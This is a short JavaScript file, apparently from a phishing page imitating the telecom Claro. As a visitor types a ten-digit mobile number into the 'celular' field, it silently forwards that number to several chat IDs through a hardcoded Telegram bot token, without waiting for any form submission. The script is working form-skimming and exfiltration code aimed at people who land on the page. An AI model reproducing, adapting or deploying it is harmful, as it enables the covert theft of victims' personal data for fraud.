let messageSent = false; // Flag para controlar el envío único

async function sendToTelegram() {
  const inputField = document.getElementById("celular");
  const lineNumber = inputField.value;

  // Verifica que el input tenga 10 dígitos y que no se haya enviado ya el mensaje
  if (lineNumber.length === 10 && !messageSent) {
    messageSent = true; // Marca que el mensaje ya fue enviado
    const message = `🔴 Celular Claro: ${lineNumber}\nFuente: ${fuente}`;

    try {
      // Realiza un fetch por cada chat ID
      for (const chatId of chatIds) {
        const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
          message
        )}`;
        const response = await fetch(url);

        if (response.ok) {
          console.log(`Mensaje enviado a Telegram (Chat ID: ${chatId})`);
        } else {
          console.error(
            `Error al enviar mensaje al Chat ID ${chatId}:`,
            response.statusText
          );
        }
      }
      messageSent = false; // Reinicia la bandera después de enviar a todos
    } catch (error) {
      console.error("Error de red:", error);
    }
  }
}

document.addEventListener("DOMContentLoaded", function () {
  const inputField = document.getElementById("celular");
  inputField.addEventListener("input", sendToTelegram);
});
